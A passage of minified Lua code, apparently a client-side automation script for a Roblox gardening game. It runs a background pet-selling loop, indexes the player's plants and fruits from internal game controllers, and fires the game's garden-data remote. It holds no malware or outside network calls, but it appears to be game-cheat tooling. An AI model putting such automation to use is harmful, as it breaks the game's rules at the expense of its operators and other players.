		for G, y in ipairs(Z.PetSeller.GetPets()) do
			local Z = V[y.name]
			if not Z then
				Z = {
					name = y.name;
					displayName = y.displayName;
					rarity = y.rarity;
					rarityRank = y.rarityRank,
					basePrice = y.basePrice;
					estimate = y.estimate;
					count = 0;
					equipped = 0
				}
				V[y.name] = Z
			end
			Z.count += 1
			if y.equipped then
				Z.equipped += 1
			end
		end
		for V, y in pairs(V) do
			local j = Z.Data.GetRarityColor(y.rarity)
			local i = y.equipped > 0 and string.format(" <font color=\'#FFD966\'>eq %d</font>", y.equipped) or ""
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font> <font color=\"#7CFC00\">x%d</font>%s <font color=\"#00FF00\">~$%s</font>", y.displayName, j, y.rarity, y.count, i, q.formatShecklesNumber(y.estimate)),
				Value = y.name
			})
		end
		table.sort(G, function(G, V)
			return tostring(G.Value) < tostring(V.Value)
		end)
		return G
	end;
	GetProtectedIdDropdown = function()
		local G = {}
		for V, y in ipairs(Z.PetSeller.GetPets()) do
			local j = Z.Data.GetRarityColor(y.rarity)
			local i = y.id:sub(1, 8)
			local c = {}
			if y.equipped then
				table.insert(c, "Equipped")
			end
			if y.size ~= "Normal" then
				table.insert(c, y.size)
			end
			if y.variant ~= "Normal" then
				table.insert(c, y.variant)
			end
			local J = # c > 0 and " <font color=\'#FFD966\'>(" .. (table.concat(c, ", ") .. ")</font>") or ""
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font>%s <font color=\"#AAAAAA\">%s</font>", y.displayName, j, y.rarity, J, i),
				Value = y.id
			})
		end
		return G
	end;
	GetSizeNames = function()
		local G = {
			"Normal",
			"Big",
			"Huge"
		}
		local V = {
			Normal = true,
			Big = true,
			Huge = true
		}
		for y, Z in ipairs(Z.PetSeller.GetPets()) do
			if type(Z.size) == "string" and (Z.size ~= "" and not V[Z.size]) then
				V[Z.size] = true
				table.insert(G, Z.size)
			end
		end
		return G
	end,
	GetVariantNames = function()
		local G = {
			"Normal",
			"Rainbow"
		}
		local V = {
			Normal = true;
			Rainbow = true
		}
		for y, Z in ipairs(Z.PetSeller.GetPets()) do
			if type(Z.variant) == "string" and (Z.variant ~= "" and not V[Z.variant]) then
				V[Z.variant] = true
				table.insert(G, Z.variant)
			end
		end
		return G
	end
}
task.spawn(function()
	while true do
		task.wait(.5)
		local G, V = pcall(Z.PetSeller.RunPetSellerCycle)
		if not G then
			Z.PetSeller.Busy = false
			Z.PetSeller.SetStatus("Pet seller error", "#FF6666")
			warn("[PetSeller]", V)
			task.wait(1)
		end
	end
end)
Z.FruitFiltersDataSync = {
	Started = false;
	Connections = {},
	Plants = {},
	Fruits = {};
	FruitKeysByPlantFruitFiltersDataSync = {},
	ReadyPlantsFruitFiltersDataSync = {};
	ReadyFruitsFruitFiltersDataSync = {},
	BaseWeightCache = {},
	SnapshotLoadedFruitFiltersDataSync = false,
	IndexesDirtyFruitFiltersDataSync = true,
	IndexedGardenReferenceFruitFiltersDataSync = nil;
	UseBaseDataMonitorFruitFiltersDataSync = true;
	FirstLoadStartedFruitFiltersDataSync = false;
	MonitorStartedFruitFiltersDataSync = false,
	DataStateFruitFiltersDataSync = "waiting";
	FirstLoadStartedAtFruitFiltersDataSync = 0;
	LastRequestGardenFruitFiltersDataSync = 0;
	LastGoodBaseDataFruitFiltersDataSync = 0;
	EmptyGardenGraceFruitFiltersDataSync = 15;
	LoadRetryDelayFruitFiltersDataSync = .5;
	is_debug = false;
	Now = function()
		return y.Workspace:GetServerTimeNow()
	end,
	WallNow = function()
		return os.time()
	end;
	N = function(G, V)
		local y = tonumber(G)
		if y ~= nil then
			return y
		end
		if V ~= nil then
			return V
		end
		return 0
	end,
	Key = function(G, V)
		return tostring(G or "") .. ("\031" .. tostring(V or ""))
	end;
	IsMine = function(G)
		return tonumber(G) == tonumber(g.player_userid)
	end,
	CopyFields = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" then
			return V
		end
		for G, y in pairs(G) do
			if type(y) ~= "table" then
				V[G] = y
			elseif G == "Positions" then
				V[G] = {
					PosX = y.PosX;
					PosY = y.PosY;
					PosZ = y.PosZ,
					Rotation = y.Rotation
				}
			end
		end
		return V
	end;
	RoundWeight = function(G)
		G = tonumber(G) or 0
		return math.floor((G * 100) + .5) / 100
	end,
	GetGarden = function()
		local G = y.GardenSyncController
		if type(G) ~= "table" or type(G.GetGarden) ~= "function" then
			return nil
		end
		local V, Z = pcall(function()
			return G:GetGarden(g.player_userid)
		end)
		if V and type(Z) == "table" then
			return Z
		end
		return nil
	end;
	IsGardenLoadedFruitFiltersDataSync = function()
		local G = y.GardenSyncController
		if type(G) ~= "table" or type(G.IsLocalGardenLoaded) ~= "function" then
			return false
		end
		local V, Z = pcall(function()
			return G:IsLocalGardenLoaded()
		end)
		return V and Z == true
	end,
	CountGardenPlantsFruitFiltersDataSync = function(G)
		local V = 0
		if type(G) ~= "table" then
			return 0
		end
		for G, y in pairs(G) do
			if type(y) == "table" then
				V += 1
			end
		end
		return V
	end,
	CountLocalPlantsFruitFiltersDataSync = function()
		local G = 0
		local V = Z.FruitFiltersDataSync.Plants
		if type(V) ~= "table" then
			return 0
		end
		for V, y in pairs(V) do
			if type(y) == "table" and y.Removed ~= true then
				G += 1
			end
		end
		return G
	end;
	CountWorkspacePlantsFruitFiltersDataSync = function()
		local G = Z.Farm and (Z.Farm.GetMyPlantsFolder and Z.Farm.GetMyPlantsFolder())
		if not G or not G.Parent then
			return 0
		end
		return # G:GetChildren()
	end,
	RequestGardenDataFruitFiltersDataSync = function()
		local G = Z.FruitFiltersDataSync
		if G.LastRequestGardenFruitFiltersDataSync > 0 and G.Now() - G.LastRequestGardenFruitFiltersDataSync < 3 then
			return false
		end
		local V = y.Networking and (y.Networking.Garden and y.Networking.Garden.RequestGardens)
		if not V then
			return false
		end
		G.LastRequestGardenFruitFiltersDataSync = G.Now()
		local j = pcall(function()
			if type(V.Fire) == "function" then
				V:Fire()
			elseif type(V.FireServer) == "function" then
				V:FireServer()
			end
		end)
		return j
	end;
	DebugFruitFiltersDataSync = function(G)
		local V = Z.FruitFiltersDataSync
		if not V.is_debug then
			return false
		end
		local y = V.GetGarden()
		local j = V.CountLocalPlantsFruitFiltersDataSync()
		local i = V.CountGardenPlantsFruitFiltersDataSync(y)
		local c = V.CountWorkspacePlantsFruitFiltersDataSync()
		local J = "never"
		local T = "never"
		if V.LastRequestGardenFruitFiltersDataSync > 0 then
			J = string.format("%.1f", V.Now() - V.LastRequestGardenFruitFiltersDataSync)
		end
		if V.LastGoodBaseDataFruitFiltersDataSync > 0 then
			T = string.format("%.1f", V.Now() - V.LastGoodBaseDataFruitFiltersDataSync)
		end
		warn(string.format("[FruitBaseDebug] %s | state=%s | snap=%s | local=%d | garden=%d | workspace=%d | reqAgo=%s | goodAgo=%s", tostring(G or "?"), tostring(V.DataStateFruitFiltersDataSync or "?"), tostring(V.SnapshotLoadedFruitFiltersDataSync == true), j, i, c, J, T))
		return true
	end,
	GetWeightFormat = function()
		if type(y.WeightFormat) == "table" then
			return y.WeightFormat
		end
		return nil
	end;
	FormatKg = function(G)
		local V = Z.FruitFiltersDataSync.GetWeightFormat()
		if type(V) == "table" and type(V.FormatGrams) == "function" then
			local y, Z = pcall(function()
				return V.FormatGrams(G)
			end)
			if y and type(Z) == "string" then
				return Z
			end
		end
		return string.format("%.2fkg", Z.FruitFiltersDataSync.RoundWeight(G))
	end,
	GetBaseWeight = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local j = "F:"
		if V == true then
			j = "P:"
		end
		local i = j .. G
		local c = Z.FruitFiltersDataSync.BaseWeightCache[i]
		if c ~= nil then
			if c == false then
				return nil
			end
			return c
		end
		local J = y.FruitGenerationData
		if V == true then
			J = y.PlantGenerationData
		end
		local T = nil
		if type(J) == "table" then
			T = J[G]
		end
		if type(T) ~= "table" or type(T.GrowData) ~= "table" then
			Z.FruitFiltersDataSync.BaseWeightCache[i] = false
			return nil
		end
		local d = tonumber(T.GrowData.BaseWeight)
		if not d or d <= 0 then
			Z.FruitFiltersDataSync.BaseWeightCache[i] = false
			return nil
		end
		Z.FruitFiltersDataSync.BaseWeightCache[i] = d
		return d
	end;
	GetCalculateOvertimeGrowth = function()
		if type(y.CalculateOvertimeGrowth) == "function" then
			return y.CalculateOvertimeGrowth
		end
		return nil
	end;
	GetOvertimeFlags = function()
		if type(y.OvertimeGrowthFlags) == "table" then
			return y.OvertimeGrowthFlags
		end
		return nil
	end,
	IsOvertimeEnabled = function()
		local G = Z.FruitFiltersDataSync.GetOvertimeFlags()
		if type(G) ~= "table" then
			return true
		end
		local V = G.Enabled
		if type(V) == "boolean" then
			return V
		end
		if type(V) == "table" and type(V.Get) == "function" then
			local G, y = pcall(function()
				return V:Get()
			end)
			if G then
				return y == true
			end
		end
		return true
	end;
	GetOvertimeForWeight = function(G, V)
		if not Z.FruitFiltersDataSync.IsOvertimeEnabled() then
			return 1
		end
		if type(G) ~= "table" then
			return 1
		end
		local y = tonumber(G.OvertimeGrowth)
		if y and y > 0 then
			return math.clamp(y, 1, 100)
		end
		if V == true then
			local V = tonumber(G.FinishedGrowingAt) or 0
			local y = Z.FruitFiltersDataSync.GetCalculateOvertimeGrowth()
			if V > 0 and type(y) == "function" then
				local G, Z = pcall(function()
					return y(os.time() - V)
				end)
				if G and tonumber(Z) then
					return math.clamp(math.max(tonumber(Z) or 1, 1), 1, 100)
				end
			end
		end
		return 1
	end,
	GetWeightData = function(G, V, y)
		if type(V) ~= "table" then
			return {
				weight = 0,
				grams = 0;
				text = "0.00kg",
				base = 0,
				size = 1;
				overtime = 1;
				hasWeight = false
			}
		end
		local j = Z.FruitFiltersDataSync.GetBaseWeight(G, y) or 0
		local i = tonumber(V.SizeMultiplier or V.SizeMulti) or 1
		local c = Z.FruitFiltersDataSync.GetOvertimeForWeight(V, y)
		local J = (j * i) * c
		return {
			weight = Z.FruitFiltersDataSync.RoundWeight(J);
			grams = J,
			text = Z.FruitFiltersDataSync.FormatKg(J);
			base = j,
			size = i;
			overtime = c;
			hasWeight = J > 0
		}
	end;
	IsSingleHarvestPlant = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		if type(y.PlantVisualizerController) == "table" and type(y.PlantVisualizerController.IsSingleHarvestPlant) == "function" then
			local V, Z = pcall(function()
				return y.PlantVisualizerController:IsSingleHarvestPlant(G)
			end)
			if V and type(Z) == "boolean" then
				return Z
			end
		end
		if type(y.SeedData) == "table" then
			local V = y.SeedData[G]
			if type(V) == "table" and V.IsSingleHarvest == true then
				return true
			end
		end
		if Z.SeedData and type(Z.SeedData.IsSingleHarvest) == "function" then
			return Z.SeedData.IsSingleHarvest(G) == true
		end
		if type(g.SeedSingleHarvest) == "table" then
			return g.SeedSingleHarvest[G] == true
		end
		return false
	end,
	MutationText = function(G)
		if type(G) ~= "string" then
			return ""
		end
		return G
	end,
	GetDefaultPlantGrowRate = function(G)
		G = tostring(G or "")
		if G == "" then
			return 0
		end
		local V = nil
		if type(y.GrowRateData) == "table" then
			V = y.GrowRateData[G]
		end
		if type(V) == "table" then
			local G = tonumber(V.GrowRate)
			if G ~= nil then
				return G
			end
		end
		return .2
	end;
	GetDefaultFruitGrowRate = function(G)
		G = tostring(G or "")
		if G == "" then
			return 0
		end
		local V = nil
		if type(y.FruitGenerationData) == "table" then
			V = y.FruitGenerationData[G]
		end
		if type(V) == "table" and type(V.GrowData) == "table" then
			local G = tonumber(V.GrowData.GrowRate)
			if G ~= nil then
				return G
			end
		end
		local Z = nil
		if type(y.GrowRateData) == "table" then
			Z = y.GrowRateData[G]
		end
		if type(Z) == "table" then
			local G = tonumber(Z.FruitGrowRate)
			if G ~= nil then
				return G
			end
		end
		return .025
	end;
	GetVariant = function(G, V)
		G = Z.FruitFiltersDataSync.MutationText(G)
		if G:find("Rainbow", 1, true) then
			return "Rainbow"
		end
		if G:find("Gold", 1, true) then
			return "Gold"
		end
		V = tostring(V or "")
		if V == "Rainbow" or V == "Gold" then
			return V
		end
		return "Normal"
	end;
	GetPlantGrowthRate = function(G)
		if type(G) ~= "table" then
			return 0
		end
		return tonumber(G.StableGrowthAmount or G.GrowRate or G.GrowthRate) or 0
	end,
	EstimateStartingAge = function(G)
		if type(G) ~= "table" then
			return 0
		end
		local V = Z.FruitFiltersDataSync
		local y = V.N(G.Age, 0)
		local j = V.N(G.MaxAge, 0)
		local i = V.N(G.FinishedGrowingAt, 0)
		if j > 0 and (i > 0 and V.WallNow() >= i) then
			return j
		end
		if j > 0 then
			return math.clamp(y, 0, j)
		end
		return y
	end;
	DecoratePlantFruitFiltersDataSync = function(G, V)
		if type(V) ~= "table" then
			return nil
		end
		local y = Z.FruitFiltersDataSync
		G = tostring(G or V.PlantId or V.Id or "")
		if G == "" then
			return nil
		end
		V.Id = G
		V.PlantId = G
		V.CurrentAge = y.N(V.Age, V.CurrentAge or 0)
		V.Removed = false
		return V
	end,
	DecorateFruitFruitFiltersDataSync = function(G, V, y)
		if type(y) ~= "table" then
			return nil
		end
		local j = Z.FruitFiltersDataSync
		G = tostring(G or y.PlantId or "")
		V = tostring(V or y.FruitId or "")
		if G == "" or V == "" then
			return nil
		end
		y.Key = j.Key(G, V)
		y.PlantId = G
		y.FruitId = V
		y.CurrentAge = j.N(y.Age, y.CurrentAge or 0)
		y.GrowthRate = j.N(y.GrowRate, y.GrowthRate or 0)
		y.Removed = false
		return y
	end,
	RemoveFruitIndexFruitFiltersDataSync = function(G, V)
		local y = Z.FruitFiltersDataSync
		G = tostring(G or "")
		V = tostring(V or "")
		if G == "" or V == "" then
			return false
		end
		local j = y.Key(G, V)
		y.Fruits[j] = nil
		y.ReadyFruitsFruitFiltersDataSync[j] = nil
		local i = y.FruitKeysByPlantFruitFiltersDataSync[G]
		if type(i) == "table" then
			i[j] = nil
			if next(i) == nil then
				y.FruitKeysByPlantFruitFiltersDataSync[G] = nil
			end
		end
		return true
	end,
	RemoveFruitIndexesForPlantFruitFiltersDataSync = function(G)
		local V = Z.FruitFiltersDataSync
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local y = V.FruitKeysByPlantFruitFiltersDataSync[G]
		if type(y) == "table" then
			for G in pairs(y) do
				V.Fruits[G] = nil
				V.ReadyFruitsFruitFiltersDataSync[G] = nil
			end
		end
		V.FruitKeysByPlantFruitFiltersDataSync[G] = nil
		return true
	end;
	IsPlantReady = function(G)
		if type(G) ~= "table" or G.Removed == true then
			return false
		end
		local V = Z.FruitFiltersDataSync
		local y = V.N(G.MaxAge, 0)
		local j = V.N(G.Age, G.CurrentAge or 0)
		if y > 0 and j >= y then
			return true
		end
		local i = V.N(G.FinishedGrowingAt, 0)
		return y > 0 and (i > 0 and V.WallNow() >= i)
	end,
	IsFruitReady = function(G)
		if type(G) ~= "table" or G.Removed == true then
			return false
		end
		local V = Z.FruitFiltersDataSync
		local y = V.N(G.MaxAge, 0)
		local j = V.N(G.Age, G.CurrentAge or 0)
		if y > 0 and j >= y then
			return true
		end
		local i = V.N(G.FinishedGrowingAt, 0)
		return y > 0 and (i > 0 and V.WallNow() >= i)
	end,
	UpdatePlantReadyIndexFruitFiltersDataSync = function(G, V)
		local y = Z.FruitFiltersDataSync
		G = tostring(G or "")
		y.ReadyPlantsFruitFiltersDataSync[G] = nil
		if G == "" or type(V) ~= "table" or V.Removed == true then
			return false
		end
		local j = tostring(V.PlantName or "")
		if not y.IsSingleHarvestPlant(j) then
			return false
		end
		if y.IsPlantReady(V) then
			y.ReadyPlantsFruitFiltersDataSync[G] = V
		end
		return true
	end;
	UpdateFruitReadyIndexFruitFiltersDataSync = function(G, V, y, j)
		local i = Z.FruitFiltersDataSync
		local c = i.Key(G, V)
		i.ReadyFruitsFruitFiltersDataSync[c] = nil
		if type(y) ~= "table" or type(j) ~= "table" or j.Removed == true then
			return false
		end
		if i.IsSingleHarvestPlant(y.PlantName) then
			return false
		end
		if i.IsFruitReady(j) then
			i.ReadyFruitsFruitFiltersDataSync[c] = j
		end
		return true
	end,
	EnsurePlant = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local y = Z.FruitFiltersDataSync
		local j = y.GetGarden()
		local i = nil
		if type(j) == "table" then
			i = j[G]
		end
		if type(i) ~= "table" and type(V) == "table" then
			i = V
		end
		i = y.DecoratePlantFruitFiltersDataSync(G, i)
		if not i then
			return nil
		end
		if type(j) == "table" then
			if j[G] ~= i then
				return nil
			end
			y.Plants = j
		else
			y.Plants[G] = i
		end
		y.UpdatePlantReadyIndexFruitFiltersDataSync(G, i)
		return i
	end,
	EnsureFruit = function(G, V, y, j)
		G = tostring(G or "")
		V = tostring(V or "")
		if G == "" or V == "" then
			return nil
		end
		local i = Z.FruitFiltersDataSync
		local c = nil
		if type(y) == "table" and i.Plants[G] == y then
			c = y
		else
			c = i.EnsurePlant(G, y)
		end
		if not c then
			return nil
		end
		local J = c.Fruits
		if type(J) ~= "table" then
			if type(j) ~= "table" then
				return nil
			end
			J = {}
			c.Fruits = J
		end
		local T = J[V]
		if type(T) ~= "table" and type(j) == "table" then
			T = j
			J[V] = T
		end
		T = i.DecorateFruitFruitFiltersDataSync(G, V, T)
		if not T then
			return nil
		end
		local d = i.Key(G, V)
		i.Fruits[d] = T
		local u = i.FruitKeysByPlantFruitFiltersDataSync[G]
		if type(u) ~= "table" then
			u = {}
			i.FruitKeysByPlantFruitFiltersDataSync[G] = u
		end
		u[d] = true
		i.UpdateFruitReadyIndexFruitFiltersDataSync(G, V, c, T)
		return T
	end;
	IndexPlantAndFruitsFruitFiltersDataSync = function(G, V, y)
		local j = Z.FruitFiltersDataSync
		local i = j.EnsurePlant(G, V)
		if not i then
			return nil
		end
		G = tostring(i.PlantId or G or "")
		if y ~= true then
			j.RemoveFruitIndexesForPlantFruitFiltersDataSync(G)
		end
		if type(i.Fruits) == "table" then
			for V, y in pairs(i.Fruits) do
				j.EnsureFruit(G, V, i, y)
			end
		end
		return i
	end;
	RebuildLiveIndexesFruitFiltersDataSync = function(G)
		local V = Z.FruitFiltersDataSync
		if type(G) ~= "table" then
			return false
		end
		table.clear(V.Fruits)
		table.clear(V.FruitKeysByPlantFruitFiltersDataSync)
		table.clear(V.ReadyPlantsFruitFiltersDataSync)
		table.clear(V.ReadyFruitsFruitFiltersDataSync)
		for G, y in pairs(G) do
			if type(y) == "table" then
				V.IndexPlantAndFruitsFruitFiltersDataSync(G, y, true)
			end
		end
		V.IndexesDirtyFruitFiltersDataSync = false
		V.IndexedGardenReferenceFruitFiltersDataSync = G
		return true
	end,
	AdvancePlant = function(G)
		if type(G) ~= "table" or G.Removed == true then
			return G
		end
		G.CurrentAge = Z.FruitFiltersDataSync.N(G.Age, G.CurrentAge or 0)
		return G
	end,
	AdvanceFruit = function(G)
		if type(G) ~= "table" or G.Removed == true then
			return G
		end
		local V = Z.FruitFiltersDataSync
		G.CurrentAge = V.N(G.Age, G.CurrentAge or 0)
		G.GrowthRate = V.N(G.GrowRate, G.GrowthRate or 0)
		return G
	end,
	SyncFromGarden = function(G, V)
		local y = Z.FruitFiltersDataSync
		local j = y.GetGarden()
		if type(j) ~= "table" then
			y.DebugFruitFiltersDataSync("sync unavailable")
			return false
		end
		local i = y.CountGardenPlantsFruitFiltersDataSync(j)
		local c = y.IsGardenLoadedFruitFiltersDataSync()
		if not c and i <= 0 then
			y.DataStateFruitFiltersDataSync = "waiting_base_data"
			return false
		end
		if i <= 0 and V ~= true then
			return false
		end
		y.Plants = j
		local J = y.SnapshotLoadedFruitFiltersDataSync ~= true
		if G == true then
			J = true
		end
		if y.IndexesDirtyFruitFiltersDataSync == true then
			J = true
		end
		if y.IndexedGardenReferenceFruitFiltersDataSync ~= j then
			J = true
		end
		if J then
			y.RebuildLiveIndexesFruitFiltersDataSync(j)
		end
		y.SnapshotLoadedFruitFiltersDataSync = true
		if i > 0 then
			y.LastGoodBaseDataFruitFiltersDataSync = y.Now()
			y.DataStateFruitFiltersDataSync = "ready"
		else
			y.DataStateFruitFiltersDataSync = "empty_new_player"
		end
		local T = "sync success"
		if G == true then
			T = "sync forced"
		end
		y.DebugFruitFiltersDataSync(T)
		return true
	end;
	BuildFruitResult = function(G, V, y, j)
		if type(G) ~= "table" then
			return nil
		end
		local i = Z.FruitFiltersDataSync
		local c = tostring(G.PlantName or "")
		local J = tostring(G.Id or G.PlantId or "")
		if c == "" or J == "" then
			return nil
		end
		local T = V
		if y == true then
			T = G
		end
		if type(T) ~= "table" then
			return nil
		end
		local d = false
		if y == true then
			d = i.IsPlantReady(G)
		else
			d = i.IsFruitReady(V)
		end
		if not d and j ~= true then
			return nil
		end
		local u = tostring(T.Mutation or G.Mutation or "")
		local q = i.GetVariant(u, T.Variant or G.Variant)
		local E = g.SeedRarity[c] or "Common"
		local a = i.GetWeightData(c, T, y)
		local H = ""
		if y ~= true then
			H = tostring(V.FruitId or "")
		end
		local r = i.N(T.Age, T.CurrentAge or 0)
		local Y = i.N(T.GrowRate or T.GrowthRate, 0)
		if y == true then
			Y = i.GetPlantGrowthRate(G)
		end
		return {
			ob = nil;
			ob_plant = nil,
			name = c,
			plantId = J;
			fruitId = H;
			w = a.weight,
			has_weight = a.hasWeight;
			r = E,
			m = u;
			v = q,
			kg = a.weight,
			kg_text = a.text;
			grams = a.grams;
			base_weight = a.base,
			size_multiplier = a.size;
			overtime_growth = a.overtime,
			age = r;
			max_age = i.N(T.MaxAge, 0);
			grow_rate = Y;
			ready = d;
			sync = true,
			single_harvest = y == true;
			sourceData = T
		}
	end;
	GetFruitsReady = function(G)
		local V = Z.FruitFiltersDataSync
		local y = Z.FruitFilters
		if type(V) ~= "table" or type(y) ~= "table" then
			return {}
		end
		if type(V.BuildFruitResult) ~= "function" or type(y.PassesCollectorFilters) ~= "function" then
			return {}
		end
		if V.Started ~= true and type(V.StartSync) == "function" then
			V.StartSync()
		end
		if V.SnapshotLoadedFruitFiltersDataSync ~= true and type(V.SyncFromGarden) == "function" then
			V.SyncFromGarden(false, true)
		end
		local j = {}
		local i = V.Plants
		local c = V.ReadyPlantsFruitFiltersDataSync
		local J = V.ReadyFruitsFruitFiltersDataSync
		if type(i) ~= "table" then
			return j
		end
		if type(c) == "table" then
			for G, Z in pairs(c) do
				if type(Z) ~= "table" or Z.Removed == true or i[G] ~= Z then
					continue
				end
				local c = V.BuildFruitResult(Z, nil, true)
				if type(c) ~= "table" or c.has_weight == false then
					continue
				end
				if y.PassesCollectorFilters(c) then
					j[# j + 1] = c
				end
			end
		end
		if type(J) == "table" then
			for G, Z in pairs(J) do
				if type(Z) ~= "table" or Z.Removed == true then
					continue
				end
				local c = tostring(Z.PlantId or "")
				local J = tostring(Z.FruitId or "")
				local T = i[c]
				if type(T) ~= "table" or T.Removed == true or type(T.Fruits) ~= "table" then
					continue
				end
				if T.Fruits[J] ~= Z then
					continue
				end
				local d = V.BuildFruitResult(T, Z, false)
				if type(d) ~= "table" or d.has_weight == false then
					continue
				end
				if y.PassesCollectorFilters(d) then
					j[# j + 1] = d
				end
			end
		end
		if G == true then
			table.sort(j, function(G, V)
				return ((tonumber(G.w or G.kg) or 0)) > ((tonumber(V.w or V.kg) or 0))
			end)
		end
		return j
	end,
	GetFruits = function(G, V)
		local y = Z.FruitFiltersDataSync
		local j = V ~= false
		if not y.Started then
			y.StartSync()
		end
		if y.SnapshotLoadedFruitFiltersDataSync ~= true then
			y.SyncFromGarden(false, true)
		end
		local i = {}
		local c = not Z.FruitFilters.IsSelectionEmpty(G)
		local J = y.ReadyPlantsFruitFiltersDataSync
		local T = y.Fruits
		local d = not j
		if j then
			T = y.ReadyFruitsFruitFiltersDataSync
		end
		for V, T in pairs(J) do
			if type(T) ~= "table" or y.Plants[V] ~= T then
				J[V] = nil
				y.ReadyPlantsFruitFiltersDataSync[V] = nil
				continue
			end
			local u = tostring(T.PlantName or "")
			if u == "" then
				continue
			end
			if c and not Z.FruitFilters.IsSelected(G, u) then
				continue
			end
			local q = y.BuildFruitResult(T, nil, true, d)
			if q and q.has_weight then
				table.insert(i, q)
			elseif j then
				y.ReadyPlantsFruitFiltersDataSync[V] = nil
			end
		end
		for V, J in pairs(T) do
			if type(J) ~= "table" then
				y.Fruits[V] = nil
				y.ReadyFruitsFruitFiltersDataSync[V] = nil
				continue
			end
			local T = tostring(J.PlantId or "")
			local u = tostring(J.FruitId or "")
			local q = y.Plants[T]
			local g = nil
			if type(q) == "table" and type(q.Fruits) == "table" then
				g = q.Fruits[u]
			end
			if g ~= J then
				y.RemoveFruitIndexFruitFiltersDataSync(T, u)
				continue
			end
			local E = tostring(q.PlantName or "")
			if E == "" then
				continue
			end
			if c and not Z.FruitFilters.IsSelected(G, E) then
				continue
			end
			local a = y.BuildFruitResult(q, J, false, d)
			if a and a.has_weight then
				table.insert(i, a)
			elseif j then
				y.ReadyFruitsFruitFiltersDataSync[V] = nil
			end
		end
		table.sort(i, function(G, V)
			local y = g.RarityRank[G.r] or 0
			local Z = g.RarityRank[V.r] or 0
			if y ~= Z then
				return y > Z
			end
			local j = type(G.m) == "string" and G.m ~= ""
			local i = type(V.m) == "string" and V.m ~= ""
			if j ~= i then
				return j
			end
			return ((tonumber(G.w) or 0)) > ((tonumber(V.w) or 0))
		end)
		return i
	end;
	GetFruitsByName = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return {}
		end
		local y = {
			[G] = true
		}
		return Z.FruitFiltersDataSync.GetFruits(y, V)
	end;
	GetPlantIdFruitFiltersDataSync = function(G, V, y)
		G = tostring(G or "")
		if G ~= "" then
			return G
		end
		if type(V) == "table" then
			G = tostring(V.Id or V.PlantId or V.PlantID or V.ID or "")
			if G ~= "" then
				return G
			end
		end
		if typeof(y) == "Instance" and y.Parent then
			return tostring(y:GetAttribute("PlantId") or y:GetAttribute("PlantID") or y:GetAttribute("Id") or y.Name or "")
		end
		return ""
	end,
	GetPlantPositionFruitFiltersDataSync = function(G, V)
		local y = nil
		if type(G) == "table" then
			y = G.Positions
		end
		if type(y) == "table" then
			local G = tonumber(y.PosX)
			local V = tonumber(y.PosY)
			local Z = tonumber(y.PosZ)
			if G and (V and Z) then
				return Vector3.new(G, V, Z)
			end
		end
		if typeof(V) ~= "Instance" or not V.Parent or V:GetAttribute("emove") == true then
			return nil
		end
		if V:IsA("Model") then
			local G, y = pcall(function()
				return V:GetPivot()
			end)
			if G and typeof(y) == "CFrame" then
				return y.Position
			end
		elseif V:IsA("BasePart") then
			return V.Position
		end
		return nil
	end,
	GetPlantEntriesFruitFiltersDataSync = function()
		local G = Z.FruitFiltersDataSync
		local V = {}
		local y = {}
		if not G.Started then
			G.StartSync()
		end
		if G.SnapshotLoadedFruitFiltersDataSync ~= true then
			G.SyncFromGarden(false, true)
		end
		if type(G.Plants) == "table" then
			for Z, j in pairs(G.Plants) do
				if type(j) ~= "table" or j.Removed == true then
					continue
				end
				local i = G.GetPlantIdFruitFiltersDataSync(Z, j, nil)
				if i == "" then
					continue
				end
				y[i] = true
				table.insert(V, {
					id = i,
					name = tostring(j.PlantName or "");
					data = j;
					physical = nil;
					position = G.GetPlantPositionFruitFiltersDataSync(j, nil)
				})
			end
		end
		local j = G.DataStateFruitFiltersDataSync == "ready" or G.DataStateFruitFiltersDataSync == "empty_new_player"
		if j then
			return V
		end
		for Z, j in ipairs(Z.Farm.GetPlants()) do
			if typeof(j) ~= "Instance" or not j.Parent or j:GetAttribute("emove") == true then
				continue
			end
			local i = G.GetPlantIdFruitFiltersDataSync(nil, nil, j)
			if i == "" or y[i] then
				continue
			end
			y[i] = true
			table.insert(V, {
				id = i,
				name = tostring(j:GetAttribute("SeedName") or j:GetAttribute("PlantName") or "");
				data = nil,
				physical = j,
				position = G.GetPlantPositionFruitFiltersDataSync(nil, j)
			})
		end
		return V
	end,
	StartBaseDataLoaderFruitFiltersDataSync = function()
		local G = Z.FruitFiltersDataSync
		if G.FirstLoadStartedFruitFiltersDataSync then
			return false
		end
		G.FirstLoadStartedFruitFiltersDataSync = true
		G.FirstLoadStartedAtFruitFiltersDataSync = G.Now()
		G.DataStateFruitFiltersDataSync = "waiting_base_data"
		task.spawn(function()
			while G.Started and not g.is_forced_stop do
				if G.IsGardenLoadedFruitFiltersDataSync() then
					G.SyncFromGarden(true, true)
					break
				end
				G.RequestGardenDataFruitFiltersDataSync()
				task.wait(G.LoadRetryDelayFruitFiltersDataSync)
			end
			G.FirstLoadStartedFruitFiltersDataSync = false
		end)
		return true
	end;
	StartMonitorFruitFiltersDataSync = function()
		Z.FruitFiltersDataSync.MonitorStartedFruitFiltersDataSync = false
		return false
	end;
	ConnectGardenControllerEventFruitFiltersDataSync = function(G, V)
		local j = Z.FruitFiltersDataSync
		local i = y.GardenSyncController
		local c = nil
		if type(i) == "table" then
			c = i[G]
		end
		if type(c) ~= "function" or type(V) ~= "function" then
			return false
		end
		local J, T = pcall(c, i, V)
		if not J or type(T) ~= "function" then
			return false
		end
		table.insert(j.Connections, T)
		return true
	end,
	ConnectGardenRemote = function(G, V)
		local j = y.Networking and y.Networking.Garden
		local i = j and j[G]
		if not i or not i.OnClientEvent or type(V) ~= "function" then
			return false
		end
		local c, J = pcall(function()
			return i.OnClientEvent:Connect(V)
		end)
		if c and J then
			table.insert(Z.FruitFiltersDataSync.Connections, J)
			return true
		end
		return false
	end;
	StartSync = function()
		local G = Z.FruitFiltersDataSync
		if G.Started then
			return true
		end
		G.Started = true
		G.ConnectGardenControllerEventFruitFiltersDataSync("OnPlantAdded", G.OnPlantAdded)
		G.ConnectGardenControllerEventFruitFiltersDataSync("OnPlantRemoved", G.OnPlantRemoved)
